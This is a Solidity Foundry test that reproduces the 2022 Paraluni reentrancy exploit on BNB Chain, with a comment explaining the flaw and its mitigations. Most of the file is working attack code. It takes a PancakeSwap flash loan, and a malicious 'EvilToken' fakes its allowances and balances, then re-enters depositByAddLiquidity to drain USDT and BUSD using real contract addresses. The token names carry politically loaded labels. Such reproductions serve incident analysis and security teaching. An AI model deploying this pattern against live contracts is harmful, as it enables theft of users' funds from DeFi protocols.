// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../TestHarness.sol";
import {TokenBalanceTracker} from '../modules/TokenBalanceTracker.sol';
import {IERC20} from "../interfaces/IERC20.sol";
import {IWETH9} from '../interfaces/IWETH9.sol';

import {IUniswapV2Pair} from '../utils/IUniswapV2Pair.sol';

// forge test --match-contract Exploit_Paraluni -vvv
/*
On Mar 13, 2022 an attacker stole $1.7MM in stable tokens from Paraluni.

// Attack Overview
Attack Tx: https://bscscan.com/tx/0x70f367b9420ac2654a5223cc311c7f9c361736a39fd4e7dff9ed1b85bab7ad54
Ethereum Transaction Viewer: https://tx.eth.samczsun.com/binance/0x70f367b9420ac2654a5223cc311c7f9c361736a39fd4e7dff9ed1b85bab7ad54

Exploited Contract Implementation: https://bscscan.com/address/0xa386f30853a7eb7e6a25ec8389337a5c6973421d#code
Attacker Address: https://bscscan.com/address/0x94bc1d555e63eea23fe7fdbf937ef3f9ac5fcf8f
Attacker Contract: https://bscscan.com/address/0x4770b5cb9d51ecb7ad5b14f0d4f2cee8e5563645
Attack Block: 16008281 

// Key Info Sources
Twitter: https://twitter.com/paraluni/status/1502951606202994694
Writeup: https://slowmist.medium.com/paraluni-incident-analysis-58be442a4f99


Principle: Reentrancy, Arbitrary tokens used.

    function depositByAddLiquidity(uint256 _pid, address[2] memory _tokens, uint256[2] memory _amounts) external{
        require(_amounts[0] > 0 && _amounts[1] > 0, "!0");
        address[2] memory tokens;
        uint256[2] memory amounts;
        (tokens[0], amounts[0]) = _doTransferIn(msg.sender, _tokens[0], _amounts[0]);
        (tokens[1], amounts[1]) = _doTransferIn(msg.sender, _tokens[1], _amounts[1]);
        depositByAddLiquidityInternal(msg.sender, _pid, tokens,amounts);
    }

    function depositByAddLiquidityInternal(address _user, uint256 _pid, address[2] memory _tokens, uint256[2] memory _amounts) internal {
        PoolInfo memory pool = poolInfo[_pid];
        require(address(pool.ticket) == address(0), "T:E");
        uint liquidity = addLiquidityInternal(address(pool.lpToken), _user, _tokens, _amounts);
        _deposit(_pid, liquidity, _user);
    }

    function addLiquidityInternal(address _lpAddress, address _user, address[2] memory _tokens, uint256[2] memory _amounts) internal returns (uint){
        //Stack too deep, try removing local variables
        DepositVars memory vars;
        approveIfNeeded(_tokens[0], address(paraRouter), _amounts[0]);
        approveIfNeeded(_tokens[1], address(paraRouter), _amounts[1]);
        vars.oldBalance = IERC20(_lpAddress).balanceOf(address(this));
        (vars.amountA, vars.amountB, vars.liquidity) = paraRouter.addLiquidity(_tokens[0], _tokens[1], _amounts[0], _amounts[1], 1, 1, address(this), block.timestamp + 600);
        vars.newBalance = IERC20(_lpAddress).balanceOf(address(this));
        require(vars.newBalance > vars.oldBalance, "B:E");
        vars.liquidity = vars.newBalance.sub(vars.oldBalance);
        addChange(_user, _tokens[0], _amounts[0].sub(vars.amountA));
        addChange(_user, _tokens[1], _amounts[1].sub(vars.amountB));
        return vars.liquidity;
    }

Vulnerability:
1. The deposit flow does not ensure that the token addresses provided match the addresses of the pools that are called (_pid)
2. The liquidity and internal balances (vars) are updated after adding liquidity inside addLiquidityInternal().
3. Because of 1. and 2., the deposit flow could be attacked by reentrancy as tokens flow before updating key variables and the pools allow malicious tokens.
The deposit flow will update twice the balance of the attacker contract (malicious token) transferring the double of stablecoins.

ATTACK:
1) Create a malicious token that spoofs allowances, balances and implements a reentrant call while calling transferFrom.
2) Send stablecoins to drain to the malicious token contract. In here, USDT and BUSD.
3) Deposit into Paraluni to the malicious token as if it was a regular admitted token.


MITIGATIONS:
1) Ensure that the tokens addresses provided match the addresses from the targeted pool or check if they are whitelisted.
2) Use a reentrancy mutex if arbitrary tokens are meant to be handled.
3) Review the checks-effects-interactions pattern and evaluate the steps at which tokens flow in and out the contract.

*/
interface IParaluniPair is IUniswapV2Pair{

}

interface IParaProxy{
    struct UserInfo {
        uint256 amount; // How many LP tokens the user has provided.
        uint256 rewardDebt;
    }
    function depositByAddLiquidity(uint256 arg0, address[2] memory arg1, uint256[2] memory arg2) external;
    function withdrawAndRemoveLiquidity(uint256 _pid, uint256 _amount, bool isBNB) external;

    function withdrawChange(address[] memory tokens) external;
    function userInfo(uint256 arg0, address arg1) external returns(UserInfo memory);
    function withdraw(uint256 arg0, uint256 arg1) external;
}

interface IParaRouter {
    function addLiquidity(address arg0, address arg1, uint256 arg2, uint256 arg3, uint256 arg4, uint256 arg5, address arg6, uint256 arg7) external;
    function removeLiquidity(address arg0, address arg1, uint256 arg2, uint256 arg3, uint256 arg4, address arg5, uint256 arg6) external;
}

contract Exploit_Paraluni is TestHarness, TokenBalanceTracker {
    IERC20 internal bscusd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    EvilToken internal ukrBadToken;
    EvilToken internal russiaGoodToken;

    IParaluniPair internal paraluniBSCBUSDPair = IParaluniPair(0x3fD4FbD7a83062942b6589A2E9e2436dd8e134D4);
    IParaRouter internal paraRouter = IParaRouter(0x48Bb5f07e78f32Ac7039366533D620C72c389797);
    IParaProxy internal paraProxy = IParaProxy(0x633Fa755a83B015cCcDc451F82C57EA0Bd32b4B4);

    IUniswapV2Pair internal pancakeBSCBUSDPair = IUniswapV2Pair(0x7EFaEf62fDdCCa950418312c6C91Aef321375A00);

    function setUp() external {
        cheat.createSelectFork('bsc', 16008280);

        cheat.deal(address(this), 0);

        ukrBadToken = new EvilToken('UkraineBadToken', 'UBT', address(paraProxy));
        russiaGoodToken = new EvilToken('RussiaGoodToken', 'RGT', address(0));

        addTokenToTracker(address(bscusd));
        addTokenToTracker(address(busd));

        updateBalanceTracker(address(this));

        console.log('===== Initial Balances =====');
        logBalancesWithLabel('Attacker Contract', address(this));
    }

    function test_attack() external {
        console.log('===== STEP 1: Request Loan =====');

        uint256 bscToRequest = bscusd.balanceOf(address(paraluniBSCBUSDPair)) * 776 / 1000;
        uint256 busdToRequest = busd.balanceOf(address(paraluniBSCBUSDPair)) * 776 / 1000;

        pancakeBSCBUSDPair.swap(
            bscToRequest, 
            busdToRequest, 
            address(this), 
            hex'deadbeef'
        );

    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes memory ) external {
        require(msg.sender  == address(pancakeBSCBUSDPair), 'Only Pancake');
        require(sender  == address(this), 'Only requested by this');

        console.log('===== STEP 2: Loan Received =====');
        logBalancesWithLabel('Attacker Contract', address(this));

        console.log('===== STEP 3: Add Liquidity to Malicious Token =====');
        bscusd.approve(address(paraRouter), 1000000000100000000000000000000);
        busd.approve(address(paraRouter), 1000000000100000000000000000000);
                
        require(bscusd.transfer(address(ukrBadToken),  bscusd.balanceOf(address(this))), 'failed bscusd funding');
        require(busd.transfer(address(ukrBadToken),  busd.balanceOf(address(this))), 'failed busd funding');

        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Ukr Token Contract', address(ukrBadToken));

        console.log('===== STEP 4: Deposit and Withdraw with malicious =====');
        uint256[2] memory amounts;
        amounts[0] = uint256(1);
        amounts[1] = uint256(1);

        paraProxy.depositByAddLiquidity(18, [address(russiaGoodToken), address(ukrBadToken)], amounts);
                
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Ukr Token Contract', address(ukrBadToken));
        
        console.log('===== STEP 5: Withdraw And Remove Liquidity From Paraproxy =====');

        IParaProxy.UserInfo memory userInfo;
        userInfo = paraProxy.userInfo(18, address(this));
        paraProxy.withdrawAndRemoveLiquidity(18, userInfo.amount, false);

        address[] memory _tokens = new address[](2);
        _tokens[0] = address(busd);
        _tokens[1] = address(bscusd);
        paraProxy.withdrawChange(_tokens);
        ukrBadToken.withdrawAsset(18);
        
        logBalancesWithLabel('Attacker Contract', address(this));
        logBalancesWithLabel('Ukr Token Contract', address(ukrBadToken));


        console.log('===== STEP 6: Repay Loan =====');
        console.log(amount0, amount1);
        require(bscusd.transfer(msg.sender, (amount0 * 1000 / 992 + 1)));
        require(busd.transfer(msg.sender, (amount1 * 1000 / 992 + 1)));

        logBalancesWithLabel('Attacker Contract', address(this));

    } 

}
contract EvilToken {
    IERC20 internal bscusd = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 internal busd = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);

    IParaProxy internal paraProxy;

    string public name;
    string public symbol;

    address internal owner;
    constructor(string memory _name, string memory _symbol, address _paraProxy)  {
        name = _name;
        symbol = symbol;

        owner = msg.sender;
        paraProxy = IParaProxy(_paraProxy);
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return 2**256 - 1;
    }
    function balanceOf(address account) external view returns (uint256) {
        return 99995000000000000000000;
    }

  function transferFrom( 
    address from,
    address to,
    uint256 amount
  ) external returns (bool) {
    if (
      address(paraProxy) != address(0) &&
      address(msg.sender) != address(paraProxy)
    ) {
      bscusd.approve(address(paraProxy),type(uint256).max);
      busd.approve(address(paraProxy), type(uint256).max);
      paraProxy.depositByAddLiquidity(   // ----------------------------- Reentrant call
        18,
        [address(bscusd), address(busd)],
        [bscusd.balanceOf(address(this)), busd.balanceOf(address(this))]
      );
    }
    return true;
  }

  function withdrawAsset(uint256 arg0) external {
    IParaProxy.UserInfo memory userInfo;
    userInfo = paraProxy.userInfo(arg0, address(this));
    paraProxy.withdrawAndRemoveLiquidity(18, userInfo.amount, false);

    bscusd.transfer(msg.sender, bscusd.balanceOf(address(this)));
    busd.transfer(msg.sender, busd.balanceOf(address(this)));
  }


}

